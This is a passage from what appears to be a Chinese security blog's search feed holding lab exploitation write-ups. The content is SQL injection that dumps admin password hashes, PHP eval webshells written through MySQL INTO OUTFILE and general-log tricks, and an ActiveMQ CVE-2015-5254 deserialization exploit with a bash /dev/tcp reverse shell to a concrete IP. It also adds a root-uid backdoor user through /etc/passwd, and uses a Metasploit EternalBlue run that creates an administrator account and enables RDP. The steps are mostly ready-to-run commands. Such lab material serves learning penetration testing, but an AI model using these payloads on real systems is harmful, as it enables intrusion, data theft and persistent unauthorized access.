1,2,3,4,5,6,group_concat(admin_name,0x7e,pwd) from blue_admin --+</span><br><span class="line"></span><br><span class="line">admin : 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">admin : admin</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139912.png" alt="image-20220317161037195"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139547.png" alt="image-20220317161201948"></p><h3 id="Sqlmap-test库"><a href="#Sqlmap-test库" class="headerlink" title="Sqlmap_test库"></a>Sqlmap_test库</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">sqlmap -u "http://172.16.12.2/uploads/ad_js.php?ad_id=1" -p ad_id --dbms=mysql --batch -dbs </span><br><span class="line"># 表</span><br><span class="line">sqlmap -u "http://172.16.12.2/uploads/ad_js.php?ad_id=1" -p ad_id --dbms=mysql --batch -D test --tables</span><br><span class="line"># 字段</span><br><span class="line">sqlmap -u "http://172.16.12.2/uploads/ad_js.php?ad_id=1" -p ad_id --dbms=mysql --batch -D test -T blue_user --columns</span><br><span class="line"># 内容</span><br><span class="line">sqlmap -u "http://172.16.12.2/uploads/ad_js.php?ad_id=1" -p ad_id --dbms=mysql --batch -D test -T blue_user -C "user_name","pwd" --dump</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139683.png" alt="image-20220317170619210"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139778.png" alt="image-20220317170637131"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139401.png" alt="image-20220317170858680"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139934.png" alt="image-20220317171331162"></p><h3 id="phpmyadmin组合getshell"><a href="#phpmyadmin组合getshell" class="headerlink" title="phpmyadmin组合getshell"></a>phpmyadmin组合getshell</h3><h5 id="phpmyadmin的表"><a href="#phpmyadmin的表" class="headerlink" title="phpmyadmin的表"></a>phpmyadmin的表</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 上面查到phpmyadmin的库是mysql</span><br><span class="line">view-source:http://172.16.12.2/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=CHAR(109, 121, 115, 113, 108)  --+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139452.png" alt="image-20220317165507058"></p><h6 id="phpmyadmin的字段"><a href="#phpmyadmin的字段" class="headerlink" title="phpmyadmin的字段"></a>phpmyadmin的字段</h6><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://172.16.12.2/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=CHAR(109, 121, 115, 113, 108) and table_name=CHAR(117, 115, 101, 114) --+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139032.png" alt="image-20220317165629987"></p><h6 id="phpmyadmini的内容"><a href="#phpmyadmini的内容" class="headerlink" title="phpmyadmini的内容"></a>phpmyadmini的内容</h6><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139109.png" alt="image-20220317165721840"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139704.png" alt="image-20220317165734419"></p><h3 id="1-into-outfile-或-info-dumpfile-写shell"><a href="#1-into-outfile-或-info-dumpfile-写shell" class="headerlink" title="1. ) into outfile 或 info dumpfile 写shell"></a>1. ) into outfile 或 info dumpfile 写shell</h3><p><strong>利用条件：</strong></p><p>l secure_file_priv 为空</p><p>l 网站绝对路径（确定有写入权限）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看secure_file_priv的状态.</span><br><span class="line">NULL 不允许导入或导出.</span><br><span class="line">/tmp 只允许在 /tmp 目录导入导出.</span><br><span class="line">空 不限制目录.</span><br><span class="line">show global variables like '%secure%';</span><br><span class="line"># 也可以在phpmyadmin页面右侧在'变量'中查看</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139999.png" alt="image-20220317210304066"><br><img src="E:/img/image-20220317210352489.png" alt="image-20220317210352489"></p><h4 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select '&lt;?php @eval($_POST[xxx]);?&gt;'into outfile '/var/www/html/uploads/2.php'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140329.png" alt="image-20220317212305766"></p><p><strong>蚁剑连接</strong><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140287.png" alt="image-20220317211035712"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140879.png" alt="image-20220317211052163"></p><h3 id="2-开启全局日志getshell"><a href="#2-开启全局日志getshell" class="headerlink" title="2. ) 开启全局日志getshell"></a>2. ) 开启全局日志getshell</h3><p><strong>利用条件</strong></p><p>l Root数据库用户（root权限）</p><p>l secure_file_priv为 NULL</p><p>l 网站绝对路径（确定有写入权限）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查看日志是否开启</span><br><span class="line">show variables like '%general%';</span><br><span class="line"># 未开启, 且没有路径, 自己手动设置吧</span><br><span class="line">set global general_log = on;# 开启全局日志</span><br><span class="line">set global general_log_file = '/var/www/html/uploads/1.php'# 设置日志路径</span><br><span class="line"># 由于不是数据库的root权限, 所以这里在设置日志路径的时候需要指定设置在网站已有的文件中.</span><br><span class="line"># 设置新的日志文件路径后可以写入, 但是无法执行, 因为没有权限. </span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140386.png" alt="image-20220317214034713"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140761.png" alt="image-20220317214344895"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140897.png" alt="image-20220317223042327"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140789.png" alt="image-20220317223153494"></p><h4 id="写入shell-1"><a href="#写入shell-1" class="headerlink" title="写入shell"></a>写入shell</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span>;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140384.png" alt="image-20220317222614783"></p><p><strong>蚁剑连接</strong><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140531.png" alt="image-20220317222706013"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181140020.png" alt="image-20220317222741507"></p><h3 id="3-创建数据库和表写入webshell"><a href="#3-创建数据库和表写入webshell" class="headerlink" title="3. ) 创建数据库和表写入webshell"></a>3. ) 创建数据库和表写入webshell</h3><p><strong>利用条件</strong></p><p>l Root数据库用户（root权限）</p><p>l secure_file_priv没有具体值</p><p>l 网站绝对路径（确定有写入权限）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在phpmyadmin中执行下面语句</span><br><span class="line">create table test ( id text(500) not null);</span><br><span class="line">insert into test (id) values('&lt;?php @eval($_POST[xxx]);?&gt;');</span><br><span class="line">select id from test into uotfile '/var/www/html/uploads/3.php';</span><br><span class="line">drop table if exists test;</span><br><span class="line"></span><br><span class="line"># 由于没有数据库的root权限, 所以无法使用创建数据库表写入webshell的操作</span><br></pre></td></tr></tbody></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ActiveMQ漏洞复现(CVE-2015-5254)</title>
      <link href="/2021/03/13/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2015-5254)/"/>
      <url>/2021/03/13/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2015-5254)/</url>
      
        <content type="html"><![CDATA[<h1 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的<strong>消息中间件</strong>，它支持Java消息服务，集群，Spring Framework等.  </p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><strong>CVE-2015-5254</strong>: Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类. 远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码. </p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>vulhub拉取漏洞环境docker启动, 不多说</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 启动命令</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="1-下载工具-jmet-进行漏洞利用"><a href="#1-下载工具-jmet-进行漏洞利用" class="headerlink" title="1. 下载工具 jmet 进行漏洞利用"></a>1. 下载工具 jmet 进行漏洞利用</h4><p>下载jmet的jar文件，并在同目录下创建一个external文件夹(否则可能会爆文件夹不存在的错误). jmet原理是使用ysoserial生成Payload并发送(其jar内自带ysoserial，无需再自己下载)，所以需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line"></span><br><span class="line">wget https:<span class="comment">//github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span></span><br><span class="line"></span><br><span class="line">mkdir external</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132119253.png" alt="image-20220313161015681"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132119639.png" alt="image-20220313161038217"></p><h4 id="2-漏洞利用过程"><a href="#2-漏洞利用过程" class="headerlink" title="2. 漏洞利用过程"></a>2. 漏洞利用过程</h4><p>​        1.) 构造(可以使用ysoserial)可执行命令的序列化对象<br>​        2.) 作为一个消息, 发送值61616端口<br>​        3.) 访问web管理页面, 读取消息, 触发漏洞</p><p>jmet的jar文件（这里windows和linux都经过了测试，windows在 “1.8.0_241”版本中可利用成功，linux在”11.0.7“不可以，应该是java版本导致的原因）</p><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># nmap</span><br><span class="line">nmap -sV 目标ip -p 8161,61616</span><br><span class="line"></span><br><span class="line"># 扫描结果</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">8161/tcp  open  http     Jetty 8.1.16.v20140903</span><br><span class="line">61616/tcp open  apachemq ActiveMQ OpenWire transport</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port61616-TCP:V=7.80%I=7%D=3/13%Time=622DE62A%P=s390x-ibm-linux-gnu%r(N</span><br><span class="line">SF:ULL,F4,"\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x0cMaxFr</span><br><span class="line">SF:ameSize\x06\0\0\0\0\x06@\0\0\0\tCacheSize\x05\0\0\x04\0\0\x0cCacheEnabl</span><br><span class="line">SF:ed\x01\x01\0\x12SizePrefixDisabled\x01\0\0\x20MaxInactivityDurationInit</span><br><span class="line">SF:alDelay\x06\0\0\0\0\0\0'\x10\0\x11TcpNoDelayEnabled\x01\x01\0\x15MaxIna</span><br><span class="line">SF:ctivityDuration\x06\0\0\0\0\0\0u0\0\x14TightEncodingEnabled\x01\x01\0\x</span><br><span class="line">SF:11StackTraceEnabled\x01\x01");</span><br></pre></td></tr></tbody></table></figure><h4 id="4-访问目标"><a href="#4-访问目标" class="headerlink" title="4.访问目标"></a>4.访问目标</h4><p>ActiveMQ默认口令是admin/admin 登陆后可以看到对应的版本信息。<strong>反序列化需要登陆后才能触发，任意文件上传访问webshell需要登录</strong><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132119769.png" alt="image-20220313204737501"></p><h4 id="5-执行命令"><a href="#5-执行命令" class="headerlink" title="5. 执行命令"></a>5. 执行命令</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/sucess"</span> -Yp ROME 受害机IP <span class="number">61616</span></span><br><span class="line"># 这个命令会给目标添加一个名为事件的队列, 访问目标http:<span class="comment">//目标IP:8161/admin/browse.jsp?JMSDestination=event, 可以看到队列中的所有消息</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132116537.png" alt="image-20220313162657117"></p><h4 id="6-访问目标"><a href="#6-访问目标" class="headerlink" title="6 访问目标"></a>6 访问目标</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0.0.0.0:8161/admin/browse.jsp?JMSDestination=event</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132116459.png" alt="image-20220313163120763"></p><h4 id="7-进入docker容器看看命令是否执行成功"><a href="#7-进入docker容器看看命令是否执行成功" class="headerlink" title="7. 进入docker容器看看命令是否执行成功"></a>7. 进入docker容器看看命令是否执行成功</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it d46c77ef5279 /bin/bash</span><br><span class="line">cd /tpm/</span><br><span class="line">ls</span><br><span class="line"># 看到/tmp/sucess创建成功, 说明漏洞利用成功</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132115875.png" alt="image-20220313163432020"></p><h4 id="8-反弹shell"><a href="#8-反弹shell" class="headerlink" title="8. 反弹shell"></a>8. 反弹shell</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"bash -i &gt;&amp; /dev/tcp/攻击机IP/端口 0&gt;&amp;1"</span> -Yp ROME 受害机IP <span class="number">61616</span></span><br><span class="line"></span><br><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"bash -i &gt;&amp; /dev/tcp/148.100.76.229/1234 0&gt;&amp;1"</span> -Yp ROME <span class="number">47.95</span><span class="number">.14</span><span class="number">.162</span> <span class="number">61616</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"bash -c {也可以将反弹shell命令以base64编码}|{base64,-d}|{bash,-i}"</span> -Yp ROME 目标ip <span class="number">61616</span></span><br><span class="line">      </span><br><span class="line"># 开启监听</span><br><span class="line">nc -lvnp <span class="number">1234</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机IP/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"># 这里不知道为什么shell弹不回来, 正常在两个vps上用命令是可以弹出来的,但是攻击命令不知道为什么弹不回来. 可能是这个环境的原因</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132115010.png" alt="image-20220313211507786"></p><h4 id="9-添加用户"><a href="#9-添加用户" class="headerlink" title="9.添加用户"></a>9.添加用户</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 添加用户</span><br><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"useradd -g root -s /bin/bash -u 10010 test"</span> -Yp ROME 目标ip <span class="number">61616</span></span><br><span class="line"> # 将 test 用户的 uid 修改为root的uid, 是test用户拥有root权限</span><br><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"sed -i "</span>s/test:x:<span class="number">10010</span>/test:x:<span class="number">0</span>/g<span class="string">" /etc/passwd"</span> -Yp ROME 目标ip <span class="number">61616</span></span><br><span class="line"># 给 test 用户设置密码</span><br><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"echo "</span>test:sd123456<span class="string">" | chpasswd"</span> -Yp ROME 目标ip <span class="number">61616</span></span><br><span class="line"># 密码为: <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"># 每一次执行攻击后, 都需要在web管理页面访问/browse.jsp?JMSDestination=event,  点击黄色框里面的id来执行注入的命令. </span><br><span class="line"># 值得注意的是，点击队列即可触发, 通过网络管理页面访问消息并触发漏洞这个过程需要管理员权限. 如果没有弱口令，可写入后等待管理员点击触发. </span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132115484.png" alt="image-20220313201046687"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132115476.png" alt="image-20220313200613216"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203132115617.png" alt="image-20220313200738713"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝 Eternalblue/DOUBLEPULSAR MS17-010 SMB RCE</title>
      <link href="/2021/03/13/%E4%BB%BB%E5%8A%A1-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2021/03/13/%E4%BB%BB%E5%8A%A1-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="MS17-010永恒之蓝"><a href="#MS17-010永恒之蓝" class="headerlink" title="MS17-010永恒之蓝"></a>MS17-010永恒之蓝</h2><p>目标: <a href="http://192.168.179.70/">http://192.168.179.70/</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210942151.png" alt="image-20220308231714267"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 启动</span><br><span class="line">sudo msfdb init &amp;&amp; msfconsole </span><br><span class="line"># 搜索 永恒之蓝渗透与攻击模块</span><br><span class="line">search ms17_010</span><br><span class="line"># 使用模块扫描</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"># 设置目标后执行</span><br><span class="line">set RHOSTS 192.168.179.70</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210942158.png" alt="image-20220308233844953"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 返回上一级后开始渗透</span><br><span class="line">back</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"># 查看可设置的选项</span><br><span class="line">show options</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943811.png" alt="image-20220308234331080"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 设置渗透目标ip</span><br><span class="line">set RHOST 192.168.179.70</span><br><span class="line"># 执行渗透</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943779.png" alt="image-20220308235807907"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943024.png" alt="image-20220308235744401"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 进入windows shell</span><br><span class="line">shell</span><br><span class="line"># 创建用户名密码</span><br><span class="line">net user as Mima1111 /add</span><br><span class="line"># 将用户 添加到管理组</span><br><span class="line">net localgroup administrators as /add </span><br><span class="line"># 开启远程桌面功能</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f </span><br><span class="line"># 开启远程桌面端口</span><br><span class="line">rdesktop 192.168.179.70:3389</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943127.png" alt="image-20220309002331667"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 打开本机远程连接, 然后 win + R 键输入命令</span><br><span class="line">mstsc</span><br><span class="line">192.168.179.70:3389</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943796.png" alt="image-20220309005709001"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943243.png" alt="image-20220309005830505"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943316.png" alt="image-20220309005944869"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943525.png" alt="image-20220309002729761"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943687.png" alt="image-20220309003300336"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210943342.png" alt="image-20220309004536904"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux常用命令</title>
      <link href="/2021/02/28/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/02/28/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p> 转载 by <a href="https://github.com/rd2coding/Road2Coding">CodeSheep</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/1.jpg" alt="1"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/2.jpg" alt="2"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/3.jpg" alt="3"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/4.jpg" alt="4"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/5.jpg" alt="5"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/6.jpg" alt="6"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/7.jpg" alt="7"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/8.jpg" alt="8"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/9.jpg" alt="9"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/10.jpg" alt="10"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/11.jpg" alt="11"></p><p><img src="../../../img/13.jpg" alt="12"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/12-16412969959801.jpg" alt="12"></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
